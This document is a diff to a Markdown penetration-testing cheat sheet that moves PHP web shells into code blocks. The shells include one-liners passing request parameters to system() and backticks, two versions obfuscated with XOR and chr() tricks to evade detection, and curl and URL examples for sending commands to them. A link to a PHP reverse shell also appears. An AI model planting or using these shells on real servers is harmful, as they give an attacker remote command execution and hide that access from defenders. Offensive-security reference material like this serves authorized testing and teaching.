@@ -20,7 +20,7 @@ ____
 * #### [VI(2) spawn shell](#vi2_spawn_shell)
 * #### [Nmap spawn shell](#nmap_spawn_shell)
 ### PHP Reverse Shell
-* #### [RCE](#rce)
+* #### [RCE](#rce_vuln)
 * #### [Obfuscate PHP Web Shell](#obfuscate_php_web_shell)
 * #### [PHP Reverse Shell](#php_reverse_shell)
 ### LFI
@@ -123,24 +123,37 @@ ____
 
 ____
 
-### PHP Reverse Shell > <a name="rce"></a>RCE
-###### <?php system($_GET["cmd"]);?
-
+### PHP Reverse Shell > <a name="rce_vuln"></a>RCE
+```php
+<?php system($_GET["cmd"]);?
+```
 ### PHP Reverse Shell > <a name="obfuscate_php_web_shell"></a>Obfuscate PHP Web Shell
-###### <?=`$_GET[0]`?>
+```php
+<?=`$_GET[0]`?>
+```
 Example: http://site.com/path/to/shell.php?0=command 
-###### <?=`$_POST[0]`?>
-* ###### Example: curl -X POST http://site.com/path/to/shell.php -d "0=command" 
-###### <?=`{$_REQUEST['_']}`?>
-* ###### Example:
-* ###### http://site.com/path/to/shell.php?_=command
-* ###### curl -X POST http://site.com/path/to/shell.php -d "_=command" '
-###### <?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
-* ###### Example: http://site.com/path/to/shell.php?0=command
-###### <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
-* ###### Example:
-* ###### http://target.com/path/to/shell.php?_=function&__=argument
-* ###### http://target.com/path/to/shell.php?_=system&__=ls
-
+```php
+<?=`$_POST[0]`?>
+```
+Example: curl -X POST http://site.com/path/to/shell.php -d "0=command" 
+```php
+<?=`{$_REQUEST['_']}`?>
+```
+Example:
+http://site.com/path/to/shell.php?_=command
+```php
+curl -X POST http://site.com/path/to/shell.php -d "_=command" '
+```
+```php
+<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+```
+Example: http://site.com/path/to/shell.php?0=command
+```php
+<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
+```
+Example:
+```html http://site.com/path/to/shell.php?_=function&__=argument
+http://site.com/path/to/shell.php?_=system&__=ls
+```
 ### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
 ###### https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
